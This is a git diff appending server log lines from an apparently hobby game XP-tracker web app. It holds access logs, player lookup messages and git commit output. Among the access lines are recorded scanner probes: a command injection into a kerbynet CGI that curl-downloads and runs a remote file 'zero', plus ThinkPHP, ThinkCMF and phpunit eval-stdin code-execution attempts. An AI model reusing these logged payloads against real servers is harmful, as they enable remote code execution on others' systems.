@@ -10838,3 +10838,988 @@
 18:49:09: seis query success
 18:49:09: 
 
+17:22:51: 
+
+17:31:55: 196.52.43.87 - - [21/Jul/2020 17:31:55] "[37mGET / HTTP/1.0[0m" 200 -
+17:31:55: 
+
+17:32:47: 149.28.73.26 - - [21/Jul/2020 17:32:47] "[37mHEAD / HTTP/1.1[0m" 200 -
+17:32:47: 
+
+17:42:45: 104.236.216.73 - - [21/Jul/2020 17:42:45] "[37mHEAD / HTTP/1.1[0m" 200 -
+17:42:45: 
+
+17:52:42: 149.28.73.26 - - [21/Jul/2020 17:52:42] "[37mHEAD / HTTP/1.1[0m" 200 -
+17:52:42: 
+
+17:55:05: 125.227.106.85 - - [21/Jul/2020 17:55:05] "[37mGET / HTTP/1.1[0m" 200 -
+17:55:05: 
+
+18:02:39: 104.236.216.73 - - [21/Jul/2020 18:02:39] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:02:39: 
+
+18:12:36: 149.28.73.26 - - [21/Jul/2020 18:12:36] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:12:36: 
+
+18:22:33: 104.236.216.73 - - [21/Jul/2020 18:22:33] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:22:33: 
+
+18:26:11: 122.117.117.103 - - [21/Jul/2020 18:26:11] "[37mGET / HTTP/1.1[0m" 200 -
+18:26:11: 
+
+18:28:48: 45.148.10.97 - - [21/Jul/2020 18:28:48] "[37mGET / HTTP/1.1[0m" 200 -
+18:28:48: 
+
+18:32:30: 149.28.73.26 - - [21/Jul/2020 18:32:30] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:32:30: 
+
+18:34:21: 103.84.202.158 - - [21/Jul/2020 18:34:21] "[37mGET / HTTP/1.1[0m" 200 -
+18:34:21: 
+
+18:42:30: 104.236.216.73 - - [21/Jul/2020 18:42:30] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:42:30: 
+
+18:52:27: 149.28.73.26 - - [21/Jul/2020 18:52:27] "[37mHEAD / HTTP/1.1[0m" 200 -
+18:52:27: 
+
+19:02:24: 104.236.216.73 - - [21/Jul/2020 19:02:24] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:02:24: 
+
+19:12:21: 149.28.73.26 - - [21/Jul/2020 19:12:21] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:12:21: 
+
+19:12:38: 202.164.212.75 - - [21/Jul/2020 19:12:38] "[37mGET / HTTP/1.1[0m" 200 -
+19:12:38: 
+
+19:14:37: 45.95.168.136 - - [21/Jul/2020 19:14:37] "[37mGET / HTTP/1.1[0m" 200 -
+19:14:37: 
+
+19:22:18: 104.236.216.73 - - [21/Jul/2020 19:22:18] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:22:18: 
+
+19:32:16: 149.28.73.26 - - [21/Jul/2020 19:32:16] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:32:16: 
+
+19:42:16: 104.236.216.73 - - [21/Jul/2020 19:42:16] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:42:16: 
+
+19:52:13: 149.28.73.26 - - [21/Jul/2020 19:52:13] "[37mHEAD / HTTP/1.1[0m" 200 -
+19:52:13: 
+
+19:52:26: 80.82.70.140 - - [21/Jul/2020 19:52:26] "[37mGET / HTTP/1.1[0m" 200 -
+19:52:26: 
+
+20:02:10: 104.236.216.73 - - [21/Jul/2020 20:02:10] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:02:10: 
+
+20:06:41: 40.74.111.168 - - [21/Jul/2020 20:06:41] "[33mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0[0m" 404 -
+20:06:41: 
+
+20:09:40: 185.16.138.26 - - [21/Jul/2020 20:09:40] "[37mGET / HTTP/1.1[0m" 200 -
+20:09:40: 
+
+20:12:07: 149.28.73.26 - - [21/Jul/2020 20:12:07] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:12:07: 
+
+20:22:03: 104.236.216.73 - - [21/Jul/2020 20:22:03] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:22:03: 
+
+20:32:01: 149.28.73.26 - - [21/Jul/2020 20:32:01] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:32:01: 
+
+20:42:00: 104.236.216.73 - - [21/Jul/2020 20:42:00] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:42:00: 
+
+20:51:57: 149.28.73.26 - - [21/Jul/2020 20:51:57] "[37mHEAD / HTTP/1.1[0m" 200 -
+20:51:57: 
+
+20:52:05: 143.255.198.242 - - [21/Jul/2020 20:52:05] "[33mPOST /cgi-bin/mainfunction.cgi HTTP/1.1[0m" 404 -
+20:52:05: 
+
+21:01:54: 104.236.216.73 - - [21/Jul/2020 21:01:54] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:01:54: 
+
+21:07:54: 161.97.81.64 - - [21/Jul/2020 21:07:54] "[37mHEAD / HTTP/1.0[0m" 200 -
+21:07:54: 
+
+21:11:52: 149.28.73.26 - - [21/Jul/2020 21:11:52] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:11:52: 
+
+21:21:49: 104.236.216.73 - - [21/Jul/2020 21:21:49] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:21:49: 
+
+21:26:27: 95.47.51.162 - - [21/Jul/2020 21:26:27] "[37mGET / HTTP/1.1[0m" 200 -
+21:26:27: 
+
+21:31:46: 149.28.73.26 - - [21/Jul/2020 21:31:46] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:31:46: 
+
+21:41:21: 193.118.53.202 - - [21/Jul/2020 21:41:21] "[37mGET / HTTP/1.1[0m" 200 -
+21:41:21: 
+
+21:41:42: 104.236.216.73 - - [21/Jul/2020 21:41:42] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:41:42: 
+
+21:51:39: 149.28.73.26 - - [21/Jul/2020 21:51:39] "[37mHEAD / HTTP/1.1[0m" 200 -
+21:51:39: 
+
+22:01:36: 104.236.216.73 - - [21/Jul/2020 22:01:36] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:01:36: 
+
+22:11:34: 149.28.73.26 - - [21/Jul/2020 22:11:34] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:11:34: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET / HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/pages.css HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/images/logo.png HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/images/goldtrophy.png HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/images/darkan.png HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:16: 72.191.29.70 - - [21/Jul/2020 22:17:16] "[37mGET /static/images/silvertrophy.png HTTP/1.1[0m" 200 -
+22:17:16: 
+
+22:17:17: 72.191.29.70 - - [21/Jul/2020 22:17:17] "[37mGET /static/images/icons/elysian_shield.png HTTP/1.1[0m" 200 -
+22:17:17: 
+
+22:21:33: 104.236.216.73 - - [21/Jul/2020 22:21:33] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:21:33: 
+
+22:26:27: 78.179.135.17 - - [21/Jul/2020 22:26:27] "[37mGET / HTTP/1.1[0m" 200 -
+22:26:27: 
+
+22:27:51: 59.126.23.171 - - [21/Jul/2020 22:27:51] "[37mGET / HTTP/1.1[0m" 200 -
+22:27:51: 
+
+22:31:31: 149.28.73.26 - - [21/Jul/2020 22:31:31] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:31:31: 
+
+22:32:21: 78.29.9.25 - - [21/Jul/2020 22:32:21] "[37mGET / HTTP/1.1[0m" 200 -
+22:32:21: 
+
+22:41:30: 104.236.216.73 - - [21/Jul/2020 22:41:30] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:41:30: 
+
+22:51:27: 149.28.73.26 - - [21/Jul/2020 22:51:27] "[37mHEAD / HTTP/1.1[0m" 200 -
+22:51:27: 
+
+23:01:23: 104.236.216.73 - - [21/Jul/2020 23:01:23] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:01:23: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[37mGET /tracker HTTP/1.1[0m" 200 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:03:51: 
+
+23:03:51: 72.191.29.70 - - [21/Jul/2020 23:03:51] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:03:51: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[37mPOST /tracker HTTP/1.1[0m" 200 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:03:58: 
+
+23:03:58: 72.191.29.70 - - [21/Jul/2020 23:03:58] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:03:58: 
+
+23:04:16: 72.191.29.70 - - [21/Jul/2020 23:04:16] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:04:16: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[37mPOST /tracker HTTP/1.1[0m" 200 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:04:52: 
+
+23:04:52: 72.191.29.70 - - [21/Jul/2020 23:04:52] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:04:52: 
+
+23:04:57: 72.191.29.70 - - [21/Jul/2020 23:04:57] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:04:57: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[37mPOST /tracker HTTP/1.1[0m" 200 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:06:37: 
+
+23:06:37: 72.191.29.70 - - [21/Jul/2020 23:06:37] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:06:37: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[37mPOST /tracker HTTP/1.1[0m" 200 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:06:48: 
+
+23:06:48: 72.191.29.70 - - [21/Jul/2020 23:06:48] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:06:48: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[37mPOST /tracker HTTP/1.1[0m" 200 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+23:07:01: 
+
+23:07:01: 72.191.29.70 - - [21/Jul/2020 23:07:01] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+23:07:01: 
+
+23:11:21: 149.28.73.26 - - [21/Jul/2020 23:11:21] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:11:21: 
+
+23:11:33: 181.143.101.194 - - [21/Jul/2020 23:11:33] "[33mPOST /cgi-bin/ViewLog.asp HTTP/1.1[0m" 404 -
+23:11:33: 
+
+23:21:21: 104.236.216.73 - - [21/Jul/2020 23:21:21] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:21:21: 
+
+23:23:37: 31.223.72.172 - - [21/Jul/2020 23:23:37] "[37mGET / HTTP/1.1[0m" 200 -
+23:23:37: 
+
+23:31:19: 149.28.73.26 - - [21/Jul/2020 23:31:19] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:31:19: 
+
+23:40:11: 114.35.47.67 - - [21/Jul/2020 23:40:11] "[37mGET / HTTP/1.1[0m" 200 -
+23:40:11: 
+
+23:41:18: 104.236.216.73 - - [21/Jul/2020 23:41:18] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:41:18: 
+
+23:51:16: 149.28.73.26 - - [21/Jul/2020 23:51:16] "[37mHEAD / HTTP/1.1[0m" 200 -
+23:51:16: 
+
+23:54:47: 168.228.198.225 - - [21/Jul/2020 23:54:47] "[37mGET / HTTP/1.1[0m" 200 -
+23:54:47: 
+
+00:01:12: 104.236.216.73 - - [22/Jul/2020 00:01:12] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:01:12: 
+
+00:11:09: 149.28.73.26 - - [22/Jul/2020 00:11:09] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:11:09: 
+
+00:12:22: 220.133.227.76 - - [22/Jul/2020 00:12:22] "[37mGET / HTTP/1.1[0m" 200 -
+00:12:22: 
+
+00:21:05: 104.236.216.73 - - [22/Jul/2020 00:21:05] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:21:05: 
+
+00:23:54: 94.124.17.130 - - [22/Jul/2020 00:23:54] "[37mGET / HTTP/1.1[0m" 200 -
+00:23:54: 
+
+00:31:03: 149.28.73.26 - - [22/Jul/2020 00:31:03] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:31:03: 
+
+00:41:00: 104.236.216.73 - - [22/Jul/2020 00:41:00] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:41:00: 
+
+00:43:17: 176.46.90.211 - - [22/Jul/2020 00:43:17] "[37mGET / HTTP/1.1[0m" 200 -
+00:43:17: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/images/darkan.png HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:18: 176.46.90.211 - - [22/Jul/2020 00:43:18] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+00:43:18: 
+
+00:43:19: 176.46.90.211 - - [22/Jul/2020 00:43:19] "[37mGET /static/images/icons/odd_old_man.png HTTP/1.1[0m" 200 -
+00:43:19: 
+
+00:50:57: 149.28.73.26 - - [22/Jul/2020 00:50:57] "[37mHEAD / HTTP/1.1[0m" 200 -
+00:50:57: 
+
+01:00:03: 195.54.160.21 - - [22/Jul/2020 01:00:03] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+01:00:03: 
+
+01:00:04: 195.54.160.21 - - [22/Jul/2020 01:00:04] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+01:00:04: 
+
+01:00:05: 195.54.160.21 - - [22/Jul/2020 01:00:05] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+01:00:05: 
+
+01:00:05: 195.54.160.21 - - [22/Jul/2020 01:00:05] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+01:00:05: 
+
+01:00:06: 195.54.160.21 - - [22/Jul/2020 01:00:06] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+01:00:06: 
+
+01:00:06: 195.54.160.21 - - [22/Jul/2020 01:00:06] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -
+01:00:06: 
+
+01:00:07: 195.54.160.21 - - [22/Jul/2020 01:00:07] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+01:00:07: 
+
+01:00:54: 104.236.216.73 - - [22/Jul/2020 01:00:54] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:00:54: 
+
+01:10:51: 149.28.73.26 - - [22/Jul/2020 01:10:51] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:10:51: 
+
+01:20:27: 176.46.90.211 - - [22/Jul/2020 01:20:27] "[37mGET / HTTP/1.1[0m" 200 -
+01:20:27: 
+
+01:20:27: 176.46.90.211 - - [22/Jul/2020 01:20:27] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -
+01:20:27: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -
+01:20:28: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[36mGET /static/images/darkan.png HTTP/1.1[0m" 304 -
+01:20:28: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -
+01:20:28: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -
+01:20:28: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -
+01:20:28: 
+
+01:20:28: 176.46.90.211 - - [22/Jul/2020 01:20:28] "[37mGET /static/images/icons/gold.png HTTP/1.1[0m" 200 -
+01:20:28: 
+
+01:20:47: 104.236.216.73 - - [22/Jul/2020 01:20:47] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:20:47: 
+
+01:21:38: 185.173.35.1 - - [22/Jul/2020 01:21:38] "[37mGET / HTTP/1.1[0m" 200 -
+01:21:38: 
+
+01:30:45: 149.28.73.26 - - [22/Jul/2020 01:30:45] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:30:45: 
+
+01:40:41: 104.236.216.73 - - [22/Jul/2020 01:40:41] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:40:41: 
+
+01:50:37: 149.28.73.26 - - [22/Jul/2020 01:50:37] "[37mHEAD / HTTP/1.1[0m" 200 -
+01:50:37: 
+
+02:00:33: 104.236.216.73 - - [22/Jul/2020 02:00:33] "[37mHEAD / HTTP/1.1[0m" 200 -
+02:00:33: 
+
+02:10:30: 149.28.73.26 - - [22/Jul/2020 02:10:30] "[37mHEAD / HTTP/1.1[0m" 200 -
+02:10:30: 
+
+02:12:26: 223.71.167.166 - - [22/Jul/2020 02:12:26] "[37mGET / HTTP/1.1[0m" 200 -
+18:49:09: sheldy query success
+18:49:09: 
+
+18:49:09: sincerely query success
+18:49:09: 
+
+18:49:10: skillsy query success
+18:49:10: 
+
+18:49:10: slimsharkie query success
+18:49:10: 
+
+18:49:10: slyjacob query success
+18:49:10: 
+
+18:49:11: slyjacob1 query success
+18:49:11: 
+
+18:49:11: snortwindex query success
+18:49:11: 
+
+18:49:11: stephenb1992 query success
+18:49:11: 
+
+18:49:11: stephenb92 query success
+18:49:11: 
+
+18:49:12: steven query success
+18:49:12: 
+
+18:49:12: sticky query success
+18:49:12: 
+
+18:49:12: sugarmama query success
+18:49:12: 
+
+18:49:13: surdok query success
+18:49:13: 
+
+18:49:13: t tex8 query success
+18:49:13: 
+
+18:49:13: tasman 3 query success
+18:49:13: 
+
+18:49:14: tbi query success
+18:49:14: 
+
+18:49:14: thetracker3 query success
+18:49:14: 
+
+18:49:14: thispot query success
+18:49:14: 
+
+18:49:14: torbjorn query success
+18:49:14: 
+
+18:49:15: trent query success
+18:49:15: 
+
+18:49:15: trenton query success
+18:49:15: 
+
+18:49:15: virus64 query success
+18:49:15: 
+
+18:49:16: volcarona query success
+18:49:16: 
+
+18:49:16: warhorse query success
+18:49:16: 
+
+18:49:16: wolf query success
+18:49:16: 
+
+18:49:17: x m a query success
+18:49:17: 
+
+18:49:17: x turtle x query success
+18:49:17: 
+
+18:49:17: xblade 20 query success
+18:49:17: 
+
+18:49:17: xexani query success
+18:49:17: 
+
+18:49:18: xie query success
+18:49:18: 
+
+18:49:18: yim query success
+18:49:18: 
+
+18:49:18: yung schniff query success
+18:49:18: 
+
+18:49:19: zee meeuw query success
+18:49:19: 
+
+18:49:19: zemouregal query success
+18:49:19: 
+
+18:49:19: zero query success
+18:49:19: 
+
+18:49:20: zeus query success
+18:49:20: 
+
+18:49:21: COMMAND: b'On branch ubuntu\nChanges not staged for commit:\n\tmodified:   ../../logs/ubuntu_2020-07-17.log\n\tmodified:   ../../static/graph.png\n\tmodified:   ../__pycache__/xp_tracker_backend.cpython-36.pyc\n\tmodified:   ../top_players\n\nno changes added to commit'
+18:49:21: 
+
+18:49:24: COMMAND: b'[ubuntu 44b8318] Pushing logs at 18:49:21 from ubuntu\n 1 file changed, 1560 insertions(+)'
+18:49:24: 
+
+18:49:24: all stats updated & cleaned & players potentially pushed. Also did top weekly!
+18:49:24: 
+
+06:49:25: 0 query success
+06:49:25: 
+
+06:49:25: 1 query success
+06:49:25: 
+
+06:49:25: 13 query success
+06:49:25: 
+
+06:49:26: 16 query success
+06:49:26: 
+
+06:49:26: 1haha1 query success
+06:49:26: 
+
+06:49:26: 44444444444 query success
+06:49:26: 
+
+06:49:27: 45kin query success
+06:49:27: 
+
+06:49:27: 753456159258 query success
+06:49:27: 
+
+06:49:27: 7yz query success
+06:49:27: 
+
+06:49:28: adtukz query success
+06:49:28: 
+
+06:49:28: ady query success
+06:49:28: 
+
+06:49:28: alethros query success
+06:49:28: 
+
+06:49:29: ancient query success
+06:49:29: 
+
+06:49:29: arc en ciel query success
+06:49:29: 
+
+06:49:29: asia query success
+06:49:29: 
+
+06:49:30: aubery query success
+06:49:30: 
+
+06:49:30: aubury query success
+06:49:30: 
+
+06:49:30: baby deezus query success
+06:49:30: 
+
+06:49:30: big mac query success
+06:49:30: 
+
+06:49:31: biskybiscuit query success
+06:49:31: 
+
+06:49:31: black knight query success
+06:49:31: 
+
+06:49:31: blazerlord query success
+06:49:31: 
+
+06:49:32: blessdanoobs query success
+06:49:32: 
+
+06:49:32: boe query success
+06:49:32: 
+
+06:49:32: box query success
+06:49:32: 
+
+06:49:33: brad query success
+06:49:33: 
+
+06:49:33: brrs query success
+06:49:33: 
+
+06:49:33: carrot query success
+06:49:33: 
+
+06:49:34: castlewars query success
+06:49:34: 
+
+06:49:34: caviel query success
+06:49:34: 
+
+06:49:34: chbachman query success
+06:49:34: 
+
+06:49:34: christopher query success
+06:49:34: 
+
+06:49:35: clickeddaisy query success
+06:49:35: 
+
+06:49:35: coconut dan query success
+06:49:35: 
+
+06:49:35: cokecane query success
+06:49:35: 
+
+06:49:36: coolcon12 query success
+06:49:36: 
+
+06:49:36: coordinates query success
+06:49:36: 
+
+06:49:36: cringe kid query success
+06:49:36: 
+
+06:49:37: crow query success
+06:49:37: 
+
+06:49:37: crown query success
+06:49:37: 
+
+06:49:37: crusader query success
+06:49:37: 
+
+06:49:38: cryptonote query success
+06:49:38: 
+
+06:49:38: dark drift7 query success
+06:49:38: 
+
+06:49:38: dbag magee query success
+06:49:38: 
+
+06:49:39: deadly were query success
+06:49:39: 
+
+06:49:39: deadlywere query success
+06:49:39: 
+
+06:49:39: death wish query success
+06:49:39: 
+
+06:49:40: deathstriger query success
+06:49:40: 
+
+06:49:40: delb query success
+06:49:40: 
+
+06:49:40: diskid query success
+06:49:40: 
+
+06:49:41: dispvm query success
+06:49:41: 
+
+06:49:41: disskill query success
+06:49:41: 
+
+06:49:41: dlainee 900 query success
+06:49:41: 
+
+06:49:42: dmcg query success
+06:49:42: 
+
+06:49:42: dot net query success
+06:49:42: 
+
+06:49:42: dreadknight query success
+06:49:42: 
+
+06:49:43: duration query success
+06:49:43: 
+
+06:49:43: duration2 query success
+06:49:43: 
+
+06:49:43: edgelord360 query success
+06:49:43: 
+
+06:49:43: edgelord420 query success
+06:49:43: 
+
+06:49:44: edgelord69 query success
+06:49:44: 
+
+06:49:44: ekiph query success
+06:49:44: 
+
+06:49:44: esmerelda query success
+06:49:44: 
+
+06:49:45: eventest query success
+06:49:45: 
+
+06:49:45: fkingalt query success
+06:49:45: 
+
+06:49:45: fkingloot query success
+06:49:45: 
+
+06:49:46: fkingmain query success
+06:49:46: 
+
+06:49:46: flamie query success
+06:49:46: 
+
+06:49:46: flan query success
+06:49:46: 
+
+06:49:47: fletching query success
+06:49:47: 
+
+06:49:47: freeziepop query success
+06:49:47: 
+
+06:49:47: gamer4life query success
+06:49:47: 
+
+06:49:48: garlic fork query success
+06:49:48: 
+
+06:49:48: garlic pork query success
+06:49:48: 
+
+06:49:48: gex546 query success
+06:49:48: 
+
+06:49:48: gexskills query success
+06:49:48: 
+
+06:49:49: goldenag query success
+06:49:49: 
+
+06:49:49: grimoire query success
+06:49:49: 
+
+06:49:49: grizzly query success
+06:49:49: 
+
+06:49:50: guine query success
+06:49:50: 
+
+06:49:50: handcrafted query success
+06:49:50: 
+
+06:49:50: heat query success
+06:49:50: 
+
+06:49:51: herieman query success
+06:49:51: 
+
+06:49:51: highkeyloki query success
+06:49:51: 
+
+06:49:51: hitler query success
+06:49:51: 
+
+06:49:52: honestly query success
+06:49:52: 
+
+06:49:52: hwguy query success
+06:49:52: 
+
